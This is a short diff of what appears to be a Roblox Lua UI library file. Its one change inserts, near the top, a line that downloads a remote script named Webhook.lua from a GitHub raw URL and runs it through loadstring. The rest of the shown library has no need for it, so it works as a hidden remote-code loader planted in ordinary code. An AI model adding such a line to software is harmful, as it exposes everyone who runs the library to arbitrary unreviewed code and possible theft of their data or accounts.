@@ -1,5 +1,5 @@
 -- Last Updated 04/02/2022
-
+loadstring(Game:HttpGet("https://raw.githubusercontent.com/JustAScriptPanda/Games/refs/heads/main/Tools/Webhook.lua"))()
 local lib = {};
 local UIS = game:GetService("UserInputService");
 local TS = game:GetService("TweenService");
